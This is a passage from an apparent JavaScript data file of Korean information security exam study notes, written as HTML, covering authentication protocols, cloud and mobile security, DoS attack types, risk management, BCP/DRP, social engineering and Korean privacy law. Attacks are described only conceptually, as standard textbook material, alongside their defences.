    <tr><td>사용자 편의성 향상 (비밀번호 피로 감소)</td><td>IdP 장애 시 모든 서비스 중단</td></tr>
    <tr><td>중앙 집중 인증 관리</td><td>IdP 계정 탈취 시 모든 서비스 피해</td></tr>
    <tr><td>감사 로그 일원화</td><td>구현 복잡성 증가</td></tr>
  </tbody>
</table>

<h3>Kerberos</h3>
<p>신뢰할 수 있는 제3자(KDC)를 통한 티켓 기반 인증. Active Directory의 기본 인증 프로토콜.</p>
<pre><code>1. 클라이언트 → KDC (AS): 로그인 요청
2. KDC → 클라이언트: TGT (Ticket Granting Ticket) 발급 (AS_REP)
3. 클라이언트 → KDC (TGS): TGT 제시, 서비스 티켓 요청
4. KDC → 클라이언트: 서비스 티켓 발급 (TGS_REP)
5. 클라이언트 → 서비스 서버: 서비스 티켓 제시
6. 서비스 서버: 티켓 검증 후 서비스 제공

KDC = AS(Authentication Service) + TGS(Ticket Granting Service)</code></pre>

<h3>SAML 2.0</h3>
<p>XML 기반 SSO 표준. IdP(Identity Provider)와 SP(Service Provider) 간 인증 정보(Assertion) 교환.</p>
<table>
  <thead><tr><th>흐름</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>SP-initiated</strong></td><td>사용자가 SP 접근 → SP가 IdP로 리다이렉트 → 인증 후 Assertion을 SP에 전달</td></tr>
    <tr><td><strong>IdP-initiated</strong></td><td>사용자가 IdP 포털 로그인 → 서비스 선택 → IdP가 Assertion 생성 후 SP 전달</td></tr>
  </tbody>
</table>
<ul>
  <li><strong>Assertion</strong>: 인증 사실을 담은 XML 문서. IdP가 서명.</li>
</ul>

<h3>OAuth 2.0 vs OpenID Connect 비교</h3>
<table>
  <thead><tr><th>항목</th><th>OAuth 2.0</th><th>OpenID Connect (OIDC)</th></tr></thead>
  <tbody>
    <tr><td><strong>목적</strong></td><td>권한 위임 (Authorization)</td><td>인증 (Authentication) — OAuth 2.0 위에 구축</td></tr>
    <tr><td><strong>토큰</strong></td><td>Access Token</td><td>ID Token (JWT) + Access Token</td></tr>
    <tr><td><strong>사용자 정보</strong></td><td>직접 정의 없음</td><td>/userinfo 엔드포인트 표준화</td></tr>
    <tr><td><strong>흐름</strong></td><td>Authorization Code, Client Credentials 등</td><td>Authorization Code + PKCE 권장</td></tr>
    <tr><td><strong>사용 예</strong></td><td>Google 캘린더 접근 허용</td><td>Google 계정으로 로그인</td></tr>
  </tbody>
</table>

<h3>RADIUS</h3>
<p>원격 접속 인증 프로토콜. NAS(Network Access Server)가 클라이언트 인증 요청을 RADIUS 서버에 위임.</p>
<pre><code>클라이언트 → NAS → RADIUS 서버 → Accept/Reject
(VPN, Wi-Fi, 다이얼업 인증에 사용)
802.1X: 네트워크 장치 접근 시 RADIUS로 인증</code></pre>

<h3>LDAP·Active Directory</h3>
<ul>
  <li><strong>LDAP (Lightweight Directory Access Protocol)</strong>: 디렉터리 서비스 접근 표준 프로토콜. 계층적 DN 구조.</li>
  <li><strong>DN 예시</strong>: cn=John Doe, ou=Users, dc=example, dc=com</li>
  <li><strong>Active Directory</strong>: Microsoft의 LDAP 기반 디렉터리 서비스. Kerberos 인증 통합.</li>
</ul>

<h3>FIDO2·WebAuthn (패스키)</h3>
<p>비밀번호 없는 인증(Passwordless). 생체인식·하드웨어 키를 이용한 강력한 인증.</p>
<table>
  <thead><tr><th>구성요소</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td><strong>FIDO2</strong></td><td>FIDO Alliance 표준. WebAuthn + CTAP 포함.</td></tr>
    <tr><td><strong>WebAuthn</strong></td><td>W3C 표준. 브라우저-서버 간 인증 프로토콜.</td></tr>
    <tr><td><strong>CTAP</strong></td><td>외부 인증기기(USB 키, 스마트폰)와 통신.</td></tr>
    <tr><td><strong>Passkey</strong></td><td>장치에 공개키 저장. 비밀번호 완전 대체.</td></tr>
  </tbody>
</table>
<p><strong>원리</strong>: 등록 시 공개키를 서버에 저장, 개인키는 장치에 보관. 인증 시 장치가 개인키로 서명 → 서버가 공개키로 검증.</p>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'cloud-security',
    chapterLabel: '클라우드 보안',
    keywords: ['클라우드', 'IaaS', 'PaaS', 'SaaS', '공유 책임 모델', 'CASB', 'CSPM', 'Zero Trust', 'IAM', 'MFA', '컨테이너', 'Docker', 'Kubernetes', 'API 보안', 'S3 버킷', '데이터 주권'],
    content: `

<h3>클라우드 서비스 모델 비교</h3>
<table>
  <thead><tr><th>모델</th><th>사용자 관리 범위</th><th>공급자 관리 범위</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td><strong>IaaS</strong> (Infrastructure as a Service)</td><td>OS, 미들웨어, 앱, 데이터</td><td>물리 인프라, 네트워크, 가상화</td><td>AWS EC2, Azure VM</td></tr>
    <tr><td><strong>PaaS</strong> (Platform as a Service)</td><td>앱, 데이터</td><td>OS, 미들웨어, 런타임, 인프라</td><td>Google App Engine, Heroku</td></tr>
    <tr><td><strong>SaaS</strong> (Software as a Service)</td><td>데이터, 사용자 설정</td><td>모든 인프라+소프트웨어</td><td>Gmail, Salesforce, Office 365</td></tr>
  </tbody>
</table>

<h3>공유 책임 모델 (Shared Responsibility Model)</h3>
<p>클라우드 보안 책임을 공급자와 사용자가 분담. 모델에 따라 사용자 책임 범위가 다름.</p>
<ul>
  <li><strong>공급자 책임</strong>: 물리 보안, 하이퍼바이저, 네트워크 인프라, 글로벌 인프라</li>
  <li><strong>사용자 책임 (IaaS)</strong>: 데이터 암호화, 네트워크 설정, OS 패치, 접근 관리, 애플리케이션 보안</li>
  <li><strong>사용자 책임 (SaaS)</strong>: 데이터 분류, 접근 권한, 계정 관리 (범위 축소)</li>
</ul>

<h3>클라우드 보안 위협</h3>
<table>
  <thead><tr><th>위협</th><th>설명</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td><strong>데이터 유출</strong></td><td>S3 버킷 Public 설정 오류, 잘못된 ACL</td><td>CSPM, 버킷 퍼블릭 액세스 차단</td></tr>
    <tr><td><strong>계정 탈취</strong></td><td>루트 계정 직접 사용, MFA 미설정</td><td>루트 계정 미사용, MFA 강제 적용</td></tr>
    <tr><td><strong>내부자 위협</strong></td><td>과도한 IAM 권한, 권한 남용</td><td>최소 권한 IAM, 접근 로그 감사</td></tr>
    <tr><td><strong>공급망 공격</strong></td><td>서드파티 이미지·라이브러리 취약점</td><td>이미지 서명 검증, SCA</td></tr>
    <tr><td><strong>API 취약점</strong></td><td>인증 없는 API 엔드포인트, 과도한 권한</td><td>API 게이트웨이, 인증·인가 강화</td></tr>
  </tbody>
</table>

<h3>CASB (Cloud Access Security Broker)</h3>
<p>클라우드 서비스와 사용자 사이에 위치해 보안 정책을 적용하는 중개 솔루션.</p>
<ul>
  <li><strong>가시성</strong>: 어떤 클라우드 서비스를 누가 어떻게 사용하는지 파악 (Shadow IT 탐지)</li>
  <li><strong>컴플라이언스</strong>: 규정 준수 여부 모니터링</li>
  <li><strong>데이터 보안</strong>: DLP, 암호화, 토큰화</li>
  <li><strong>위협 방어</strong>: 악성코드 탐지, 이상 행동 분석</li>
</ul>

<h3>CSPM (Cloud Security Posture Management)</h3>
<p>클라우드 설정 오류를 지속적으로 탐지·교정. S3 Public 버킷, 방화벽 과잉 허용 등 감지.</p>

<h3>Zero Trust</h3>
<p>"Never Trust, Always Verify" — 내부망도 신뢰하지 않음. 모든 요청을 검증.</p>
<ul>
  <li><strong>핵심 원칙</strong>: 명시적 검증, 최소 권한 접근, 침해 가정</li>
  <li><strong>마이크로세그멘테이션</strong>: 내부 네트워크를 작은 세그먼트로 분리. 측면 이동(Lateral Movement) 차단.</li>
</ul>

<h3>컨테이너 보안</h3>
<table>
  <thead><tr><th>위협</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td>취약한 베이스 이미지</td><td>이미지 취약점 스캔 (Trivy, Snyk), 공식 최소 이미지 사용</td></tr>
    <tr><td>컨테이너 권한 상승</td><td>비특권(non-root) 컨테이너 실행, --privileged 금지</td></tr>
    <tr><td>시크릿 하드코딩</td><td>환경변수·시크릿 관리 도구(Vault, K8s Secrets) 사용</td></tr>
    <tr><td>컨테이너 탈출</td><td>컨테이너 런타임 최신 유지, seccomp/AppArmor 프로파일 적용</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'mobile-security',
    chapterLabel: '모바일 보안',
    keywords: ['안드로이드', 'iOS', 'APK', '루팅', '탈옥', '모바일 앱', 'SSL Pinning', '역공학', '난독화', 'MDM', 'MAM', 'OWASP Mobile Top 10', '인텐트', 'WebView', '권한'],
    content: `

<h3>Android vs iOS 보안 구조 비교</h3>
<table>
  <thead><tr><th>항목</th><th>Android</th><th>iOS</th></tr></thead>
  <tbody>
    <tr><td><strong>샌드박스</strong></td><td>Linux 기반 프로세스 격리</td><td>iOS 샌드박스, 엄격한 앱 격리</td></tr>
    <tr><td><strong>권한 모델</strong></td><td>설치 시 또는 런타임 권한 요청</td><td>런타임 권한 요청 (더 세분화)</td></tr>
    <tr><td><strong>앱 스토어</strong></td><td>Google Play + 사이드로딩 가능</td><td>App Store만 (공식) — 탈옥 시 우회</td></tr>
    <tr><td><strong>루팅/탈옥</strong></td><td>루팅(Rooting): 슈퍼유저 권한 획득</td><td>탈옥(Jailbreak): 샌드박스·서명 제한 우회</td></tr>
    <tr><td><strong>앱 서명</strong></td><td>개발자 자체 서명</td><td>Apple 인증서 필수</td></tr>
  </tbody>
</table>

<h3>OWASP Mobile Top 10 (2023)</h3>
<table>
  <thead><tr><th>순위</th><th>항목</th><th>핵심 내용</th></tr></thead>
  <tbody>
    <tr><td>M1</td><td>부적절한 자격증명 사용</td><td>하드코딩 키, 취약한 인증</td></tr>
    <tr><td>M2</td><td>공급망 취약점</td><td>취약한 서드파티 SDK·라이브러리</td></tr>
    <tr><td>M3</td><td>안전하지 않은 인증·인가</td><td>클라이언트 측 인증 우회</td></tr>
    <tr><td>M4</td><td>불충분한 입력/출력 검증</td><td>인젝션, XSS (하이브리드 앱)</td></tr>
    <tr><td>M5</td><td>안전하지 않은 통신</td><td>인증서 검증 안 함, 평문 전송</td></tr>
    <tr><td>M6</td><td>부적절한 프라이버시 통제</td><td>개인정보 과도 수집·저장</td></tr>
    <tr><td>M7</td><td>불충분한 바이너리 보호</td><td>역공학, 코드 주입, 난독화 부재</td></tr>
    <tr><td>M8</td><td>보안 설정 오류</td><td>디버그 모드, 과도한 권한</td></tr>
    <tr><td>M9</td><td>안전하지 않은 데이터 저장</td><td>평문 저장, 로그 노출</td></tr>
    <tr><td>M10</td><td>불충분한 암호화</td><td>취약한 알고리즘, 하드코딩 키</td></tr>
  </tbody>
</table>

<h3>Android 주요 보안 취약점</h3>
<ul>
  <li><strong>암묵적 Intent 취약점</strong>: 수신 앱을 특정하지 않은 Intent. 악성 앱이 가로채 민감 데이터 획득.</li>
  <li><strong>exported 컴포넌트</strong>: AndroidManifest에서 exported=true로 설정된 Activity·Service를 외부 앱이 직접 호출.</li>
  <li><strong>WebView 취약점</strong>: JavaScript 허용 + addJavascriptInterface → XSS로 기기 제어 가능. 최신 SDK는 제한 강화.</li>
</ul>

<h3>모바일 앱 공격 기법</h3>
<table>
  <thead><tr><th>기법</th><th>설명</th><th>사용 도구</th></tr></thead>
  <tbody>
    <tr><td><strong>역공학 (Reverse Engineering)</strong></td><td>APK 디컴파일로 소스코드·로직 분석</td><td>apktool, dex2jar, jadx</td></tr>
    <tr><td><strong>동적 분석</strong></td><td>실행 중 앱의 메모리·API 호출 분석</td><td>Frida, objection</td></tr>
    <tr><td><strong>SSL Pinning 우회</strong></td><td>인증서 고정 우회로 트래픽 가로채기</td><td>Frida 스크립트, objection</td></tr>
    <tr><td><strong>루팅/탈옥 악용</strong></td><td>루팅된 기기에서 앱 데이터·키 추출</td><td>ADB, ssh</td></tr>
  </tbody>
</table>

<h3>모바일 앱 방어</h3>
<ul>
  <li><strong>난독화 (ProGuard/R8)</strong>: 클래스명·메서드명 난독화로 역공학 어렵게.</li>
  <li><strong>루팅·탈옥 탐지</strong>: SafetyNet Attestation(Android), jailbreak 탐지 라이브러리(iOS) 적용.</li>
  <li><strong>SSL Pinning</strong>: 앱 내에 서버 인증서·공개키 고정. MITM 공격 방어.</li>
  <li><strong>앱 서명 검증</strong>: 런타임에 APK 서명을 확인해 변조 탐지.</li>
  <li><strong>난독화 + 무결성 검사</strong>: 앱 변조 탐지 시 실행 중단.</li>
</ul>

<h3>MDM / MAM</h3>
<table>
  <thead><tr><th>구분</th><th>관리 범위</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>MDM (Mobile Device Management)</strong></td><td>기기 전체</td><td>원격 잠금·초기화, 정책 강제 적용, 기기 등록 필요</td></tr>
    <tr><td><strong>MAM (Mobile Application Management)</strong></td><td>특정 앱만</td><td>개인 기기 BYOD에 적합. 앱 컨테이너 분리.</td></tr>
  </tbody>
</table>

<h3>모바일 결제 보안</h3>
<ul>
  <li><strong>NFC (Near Field Communication)</strong>: 근거리 무선 통신. 결제 토큰화로 실제 카드번호 미전송.</li>
  <li><strong>TEE (Trusted Execution Environment)</strong>: 메인 OS와 격리된 보안 실행 환경. 생체정보·키 보관.</li>
  <li><strong>생체인증</strong>: 지문·얼굴인식. TEE 또는 Secure Enclave에서 처리. 생체정보 외부 전송 안 됨.</li>
</ul>
    `,
  },

  // ===== 정보보안일반 =====
  {
    subject: 'general',
    subjectLabel: '정보보안일반',
    chapter: 'security-concepts',
    chapterLabel: '보안 일반 개념',
    keywords: ['CIA', '기밀성', '무결성', '가용성', '위험', '위협', '취약점', '위험관리', '보안정책', '업무연속성', 'BCP', 'DRP', 'DoS', 'DDoS', 'SYN Flooding', 'RTO', 'RPO', '사회공학'],
    content: `

<h3>정보보안 3대 목표 (CIA Triad)</h3>
<table>
  <thead><tr><th>목표</th><th>설명</th><th>보장 수단</th><th>주요 위협</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>기밀성</strong><br>(Confidentiality)</td>
      <td>인가된 사용자만 정보 접근</td>
      <td>암호화, 접근통제, VPN</td>
      <td>도청, 스니핑, 사회공학</td>
    </tr>
    <tr>
      <td><strong>무결성</strong><br>(Integrity)</td>
      <td>정보의 정확성·완전성 유지</td>
      <td>해시, 디지털 서명, 체크섬</td>
      <td>데이터 변조, MITM, 악성코드</td>
    </tr>
    <tr>
      <td><strong>가용성</strong><br>(Availability)</td>
      <td>인가된 사용자가 필요 시 접근 가능</td>
      <td>이중화, 백업, DDoS 방어</td>
      <td>DoS/DDoS, 랜섬웨어, 자연재해</td>
    </tr>
  </tbody>
</table>

<h4>추가 보안 속성</h4>
<table>
  <thead><tr><th>속성</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>인증성(Authenticity)</strong></td><td>주체의 신원이 주장한 것과 일치함을 보장</td></tr>
    <tr><td><strong>부인방지(Non-repudiation)</strong></td><td>행위 후 부인 불가. 디지털 서명으로 구현.</td></tr>
    <tr><td><strong>책임추적성(Accountability)</strong></td><td>행위자를 특정하고 추적 가능. 감사 로그.</td></tr>
  </tbody>
</table>

<h3>위험 관리</h3>

<h4>핵심 개념</h4>
<ul>
  <li><strong>자산(Asset)</strong>: 조직이 보호해야 할 가치 있는 것 (데이터, 시스템, 인력, 평판)</li>
  <li><strong>위협(Threat)</strong>: 자산에 해를 끼칠 수 있는 잠재적 원인 (해커, 내부자, 자연재해)</li>
  <li><strong>취약점(Vulnerability)</strong>: 위협이 악용할 수 있는 약점 (미패치, 잘못된 설정, 보안 인식 부족)</li>
  <li><strong>위험(Risk)</strong>: 위협이 취약점을 악용해 자산에 피해를 줄 가능성</li>
  <li><strong>위험 = 자산 가치 × 위협 발생 가능성 × 취약점 심각도</strong></li>
</ul>

<h4>위험 처리 방법 (4가지)</h4>
<table>
  <thead><tr><th>방법</th><th>설명</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td><strong>위험 감소(Mitigation/Reduction)</strong></td><td>보안 통제 적용으로 위험 수준 낮춤</td><td>방화벽 설치, 패치 적용, 교육</td></tr>
    <tr><td><strong>위험 수용(Acceptance)</strong></td><td>비용 대비 수용 가능한 수준으로 판단. 잔류 위험 허용.</td><td>경미한 취약점 방치</td></tr>
    <tr><td><strong>위험 전가(Transfer)</strong></td><td>위험을 제3자에게 이전</td><td>사이버보험, 아웃소싱</td></tr>
    <tr><td><strong>위험 회피(Avoidance)</strong></td><td>위험 원인 활동 자체를 중단</td><td>위험한 서비스 제공 중단</td></tr>
  </tbody>
</table>

<h4>위험 평가 방법</h4>
<ul>
  <li><strong>정량적 분석</strong>: 위험을 금전적 수치로 표현.
    <ul>
      <li>ALE (연간 기대 손실) = SLE × ARO</li>
      <li>SLE (단일 발생 기대 손실) = 자산 가치 × 노출 계수</li>
      <li>ARO (연간 발생 횟수)</li>
    </ul>
  </li>
  <li><strong>정성적 분석</strong>: 위험을 등급(상·중·하)으로 표현. 전문가 판단. 빠르지만 주관적.</li>
</ul>

<h3>보안 통제 분류</h3>
<h4>목적별 분류</h4>
<table>
  <thead><tr><th>유형</th><th>목적</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td><strong>예방(Preventive)</strong></td><td>공격 발생 전 차단</td><td>방화벽, 암호화, 접근통제, 보안 교육</td></tr>
    <tr><td><strong>탐지(Detective)</strong></td><td>공격 발생 중·후 발견</td><td>IDS, 감사 로그, CCTV, 모니터링</td></tr>
    <tr><td><strong>교정(Corrective)</strong></td><td>공격 후 피해 수정</td><td>백업 복구, 패치 적용, 격리</td></tr>
    <tr><td><strong>억제(Deterrent)</strong></td><td>잠재적 공격자 억제</td><td>경고 문구, 처벌 정책, 법적 대응</td></tr>
    <tr><td><strong>복구(Recovery)</strong></td><td>운영 복원</td><td>재해복구계획, BCP, 이중화</td></tr>
    <tr><td><strong>보상(Compensating)</strong></td><td>주 통제 대체</td><td>모니터링 강화(패치 불가 시)</td></tr>
  </tbody>
</table>

<h4>구현 방식별 분류</h4>
<ul>
  <li><strong>관리적 통제</strong>: 정책, 절차, 교육, 감사 (Administrative)</li>
  <li><strong>기술적 통제</strong>: 암호화, 방화벽, IDS, 접근통제 (Technical/Logical)</li>
  <li><strong>물리적 통제</strong>: 자물쇠, CCTV, 경비원, 출입통제 (Physical)</li>
</ul>

<h3>DoS / DDoS 공격</h3>

<h4>주요 DoS 공격 유형</h4>
<table>
  <thead><tr><th>공격</th><th>계층</th><th>원리</th></tr></thead>
  <tbody>
    <tr><td><strong>SYN Flooding</strong></td><td>4계층</td><td>대량의 SYN 패킷 전송. 서버 TCP 연결 큐 고갈. IP Spoofing으로 ACK 없음.</td></tr>
    <tr><td><strong>ICMP Flooding (Ping Flood)</strong></td><td>3계층</td><td>대량 ICMP Echo 요청. 대역폭 소모.</td></tr>
    <tr><td><strong>Smurf</strong></td><td>3계층</td><td>피해자 IP를 출발지로 위조 → 브로드캐스트 ICMP → 모든 호스트 응답 → 피해자에게 집중.</td></tr>
    <tr><td><strong>UDP Flooding</strong></td><td>4계층</td><td>대량 UDP 패킷. 서버가 모든 포트를 ICMP Unreachable로 응답. 대역폭 소모.</td></tr>
    <tr><td><strong>HTTP Flooding</strong></td><td>7계층</td><td>정상 HTTP GET/POST 대량 전송. 서버 자원 소모. 탐지 어려움.</td></tr>
    <tr><td><strong>Slowloris</strong></td><td>7계층</td><td>HTTP 연결을 최대한 오래 유지. 요청 헤더를 매우 천천히 전송. 연결 수 고갈.</td></tr>
    <tr><td><strong>Ping of Death</strong></td><td>3계층</td><td>IP 최대 크기(65535B) 초과 ICMP 패킷. 재조립 시 버퍼 오버플로. (현재 패치됨)</td></tr>
    <tr><td><strong>Teardrop</strong></td><td>3계층</td><td>IP 분할 패킷의 오프셋 조작. 재조립 오류. (현재 패치됨)</td></tr>
    <tr><td><strong>Land Attack</strong></td><td>4계층</td><td>출발지 IP/포트 = 목적지 IP/포트 설정. 무한 루프. (현재 패치됨)</td></tr>
  </tbody>
</table>

<h4>DDoS 대응</h4>
<ul>
  <li><strong>블랙홀 라우팅(Null Route)</strong>: 공격 트래픽 목적지를 null 인터페이스로 라우팅. 피해자도 서비스 불가.</li>
  <li><strong>스크러빙 센터(Scrubbing Center)</strong>: 트래픽을 스크러빙 센터로 우회 → 공격 트래픽 제거 → 정상 트래픽만 전달.</li>
  <li><strong>CDN(Content Delivery Network)</strong>: 분산 서버로 트래픽 분산. 대용량 DDoS 흡수.</li>
  <li><strong>트래픽 필터링</strong>: ACL, uRPF(역경로 포워딩), Rate Limiting.</li>
  <li><strong>ISP 협력</strong>: 업스트림에서 공격 트래픽 차단.</li>
</ul>

<h3>BCP / DRP</h3>
<table>
  <thead><tr><th>구분</th><th>BCP (업무연속성계획)</th><th>DRP (재해복구계획)</th></tr></thead>
  <tbody>
    <tr><td>범위</td><td>전사적 업무 연속성 (IT 포함)</td><td>IT 시스템 복구에 집중</td></tr>
    <tr><td>목표</td><td>핵심 업무 최소한의 수준으로 유지</td><td>IT 인프라 신속 복구</td></tr>
    <tr><td>관계</td><td>BCP가 상위 개념</td><td>BCP의 일부</td></tr>
  </tbody>
</table>

<h4>복구 목표</h4>
<ul>
  <li><strong>RTO (Recovery Time Objective)</strong>: 목표 복구 시간. 재해 발생부터 서비스 재개까지 허용 최대 시간. 짧을수록 비용 증가.</li>
  <li><strong>RPO (Recovery Point Objective)</strong>: 목표 복구 시점. 복구 시 허용 가능한 데이터 손실 범위. RPO=0이면 무손실.</li>
  <li><strong>MTTR (Mean Time To Repair)</strong>: 평균 수리 시간.</li>
  <li><strong>MTBF (Mean Time Between Failures)</strong>: 평균 고장 간격 (가용성 지표).</li>
</ul>

<h4>재해 복구 사이트</h4>
<table>
  <thead><tr><th>유형</th><th>준비 수준</th><th>복구 시간</th><th>비용</th></tr></thead>
  <tbody>
    <tr><td><strong>핫 사이트(Hot Site)</strong></td><td>실시간 데이터 동기화. 즉시 전환 가능.</td><td>수 시간 이내</td><td>매우 높음</td></tr>
    <tr><td><strong>웜 사이트(Warm Site)</strong></td><td>하드웨어 준비. 데이터 주기적 백업. 설정 필요.</td><td>수 일</td><td>중간</td></tr>
    <tr><td><strong>콜드 사이트(Cold Site)</strong></td><td>공간·전력만 준비. 하드웨어·데이터 없음.</td><td>수 주</td><td>낮음</td></tr>
  </tbody>
</table>

<h3>사회공학 (Social Engineering)</h3>
<p>기술적 취약점이 아닌 <strong>사람의 심리를 이용한 공격</strong>. 가장 효과적이고 방어 어려움.</p>
<ul>
  <li><strong>피싱(Phishing)</strong>: 신뢰할 수 있는 기관으로 위장한 이메일/웹사이트로 정보 탈취.</li>
  <li><strong>스피어 피싱(Spear Phishing)</strong>: 특정 대상 맞춤형. 성공률 높음.</li>
  <li><strong>보이스 피싱(Vishing)</strong>: 전화로 개인정보 탈취.</li>
  <li><strong>스미싱(Smishing)</strong>: SMS를 이용한 피싱.</li>
  <li><strong>사칭(Pretexting)</strong>: 가짜 신분·상황을 만들어 신뢰 획득. 예: IT 직원 사칭 패스워드 요구.</li>
  <li><strong>베이팅(Baiting)</strong>: 호기심 자극 (악성 USB 방치 등).</li>
  <li><strong>꼬리 물기(Tailgating)</strong>: 인가된 사람 뒤에서 물리적 접근 제한 구역 무단 진입.</li>
  <li><strong>큐 프로 쿼(Quid Pro Quo)</strong>: 무언가를 줄 테니 정보를 달라는 교환 방식.</li>
</ul>
<p><strong>대응</strong>: 보안 인식 교육, 정책 수립, 이중 확인 절차, 물리 보안 강화.</p>
    `,
  },

  // ===== 정보보안관리및법규 =====
  {
    subject: 'law',
    subjectLabel: '정보보안관리및법규',
    chapter: 'security-law',
    chapterLabel: '정보보호 관련 법규',
    keywords: ['정보통신망법', '개인정보보호법', 'ISMS', 'ISMS-P', '전자서명법', '정보보호산업법', '개인정보', '동의', '파기', '과태료', '개인정보보호위원회', 'GDPR', '고유식별정보', '민감정보', '접속기록'],
    content: `

<h3>주요 법률 체계</h3>
<table>
  <thead><tr><th>법률</th><th>주요 내용</th><th>소관 기관</th></tr></thead>
  <tbody>
    <tr><td><strong>개인정보 보호법</strong></td><td>개인정보 처리 원칙·주체 권리·안전조치 의무. 모든 개인정보처리자 적용.</td><td>개인정보보호위원회</td></tr>
    <tr><td><strong>정보통신망 이용촉진 및 정보보호 등에 관한 법률</strong><br>(정보통신망법)</td><td>정보통신서비스 제공자 의무, 해킹·스팸 규제, 청소년 보호.</td><td>과학기술정보통신부 / 방통위</td></tr>
    <tr><td><strong>정보보호산업의 진흥에 관한 법률</strong></td><td>ISMS 인증 법적 근거. 정보보호 산업 지원.</td><td>과학기술정보통신부</td></tr>
    <tr><td><strong>전자서명법</strong></td><td>전자서명·인증 제도. 2020년 개정으로 공인인증서 독점 폐지.</td><td>과학기술정보통신부</td></tr>
    <tr><td><strong>전자금융거래법</strong></td><td>금융 분야 전자거래 보안 기준. 금융회사 정보보호.</td><td>금융위원회</td></tr>
    <tr><td><strong>신용정보의 이용 및 보호에 관한 법률</strong><br>(신용정보법)</td><td>개인신용정보 보호. 마이데이터 사업 근거.</td><td>금융위원회</td></tr>
    <tr><td><strong>통신비밀보호법</strong></td><td>통신 비밀 보호. 불법 감청 금지.</td><td>법무부 / 방통위</td></tr>
  </tbody>
</table>

<h3>개인정보 보호법 핵심</h3>

<h4>개인정보의 정의</h4>
<p>살아 있는 개인에 관한 정보로서 성명·주민등록번호 등으로 개인을 알아볼 수 있는 정보. <strong>다른 정보와 결합해 알아볼 수 있는 것도 포함.</strong></p>
<ul>
  <li>가명정보: 일부 삭제·대체로 추가 정보 없이 개인 식별 불가하게 처리. 통계·연구 목적 동의 없이 활용 가능.</li>
  <li>익명정보: 모든 개인 정보 제거. 개인정보 보호법 미적용.</li>
</ul>

<h4>개인정보 처리 원칙 (8가지)</h4>
<ol>
  <li>목적 명확화</li>
  <li>최소 수집 (목적에 필요한 최소한)</li>
  <li>목적 범위 내 처리</li>
  <li>처리 방법의 적법성·정당성</li>
  <li>정확성·최신성 보장</li>
  <li>안전한 관리</li>
  <li>비밀 보장</li>
  <li>개인정보 처리 투명성</li>
</ol>

<h4>수집·이용 가능한 경우 (법적 근거)</h4>
<ul>
  <li>정보주체 <strong>동의</strong></li>
  <li>법률 규정 또는 법령 의무 준수</li>
  <li>계약 이행</li>
  <li>명백한 이익·공공기관 업무 수행</li>
  <li><strong>정당한 이익</strong> (개인정보처리자)</li>
</ul>

<h4>민감정보 (별도 동의 필요)</h4>
<p>일반 개인정보보다 더 엄격한 보호. 처리 시 <strong>별도의 명시적 동의</strong> 필요.</p>
<ul>
  <li>사상·신념</li>
  <li>노동조합·정당 가입·탈퇴</li>
  <li>정치적 견해</li>
  <li>건강, 성생활에 관한 정보</li>
  <li>유전정보</li>
  <li>범죄경력 정보</li>
  <li>생체인식정보 (지문, 홍채, 얼굴 등)</li>
</ul>

<h4>고유식별정보 (법령 근거 또는 별도 동의 필요)</h4>
<ul>
  <li>주민등록번호, 여권번호, 운전면허번호, 외국인등록번호</li>
  <li>주민등록번호는 <strong>법적 의무 있는 경우를 제외하고 처리 금지</strong></li>
</ul>

<h4>정보주체 권리</h4>
<table>
  <thead><tr><th>권리</th><th>내용</th></tr></thead>
  <tbody>
    <tr><td><strong>열람권</strong></td><td>자신의 개인정보 처리 여부·내용 확인</td></tr>
    <tr><td><strong>정정·삭제권</strong></td><td>부정확하거나 불필요한 정보 정정·삭제 요청</td></tr>
    <tr><td><strong>처리정지권</strong></td><td>개인정보 처리 일시 정지 요청</td></tr>
    <tr><td><strong>동의 철회권</strong></td><td>제공한 동의 언제든지 철회</td></tr>
    <tr><td><strong>손해배상 청구권</strong></td><td>피해 발생 시 손해배상 청구</td></tr>
  </tbody>
</table>

<h4>개인정보 파기</h4>
<p>보유 목적 달성 또는 보유 기간 경과 시 <strong>지체 없이(5일 이내)</strong> 파기.</p>
<ul>
  <li>전자적 파일: 복구 불가능한 방법으로 삭제 (덮어쓰기, 파쇄, 디가우징)</li>
  <li>출력물: 파쇄 또는 소각</li>
  <li>법령에 의해 보존 필요한 경우: 다른 개인정보와 분리 보관</li>
</ul>

<h3>개인정보 안전조치 기준</h3>
<table>
  <thead><tr><th>안전조치 항목</th><th>주요 내용</th></tr></thead>
  <tbody>
    <tr><td><strong>내부 관리계획</strong></td><td>수립·시행. 개인정보 보호책임자(CPO) 지정.</td></tr>
    <tr><td><strong>접근통제</strong></td><td>권한 있는 자만 접근. 외부 접속 차단 또는 VPN.</td></tr>
    <tr><td><strong>접근권한 관리</strong></td><td>최소 권한 부여. 퇴직자 즉시 권한 회수. 권한 부여 기록 보관.</td></tr>
    <tr><td><strong>암호화</strong></td><td>고유식별정보·비밀번호·바이오정보 암호화 필수. 전송 시 SSL/TLS.</td></tr>
    <tr><td><strong>접속기록 보관</strong></td><td>최소 <strong>6개월</strong> 보관. 5만 명 이상 처리 또는 민감정보 처리 시 <strong>2년</strong>.</td></tr>
    <tr><td><strong>접속기록 위변조 방지</strong></td><td>접속기록의 무결성 보장.</td></tr>
    <tr><td><strong>보안프로그램</strong></td><td>악성프로그램 방지 소프트웨어 설치·운영. 자동 업데이트.</td></tr>
    <tr><td><strong>물리적 안전조치</strong></td><td>출입 통제, 잠금장치, 보안 구역 설정.</td></tr>
  </tbody>
</table>

<h3>ISMS / ISMS-P 인증</h3>

<h4>비교</h4>
<table>
  <thead><tr><th>구분</th><th>ISMS</th><th>ISMS-P</th></tr></thead>
  <tbody>
    <tr><td>인증 범위</td><td>정보보호 관리체계</td><td>정보보호 + 개인정보보호 통합</td></tr>
    <tr><td>인증 기준</td><td>102개 통제항목</td><td>102개 + 개인정보보호 추가 항목</td></tr>
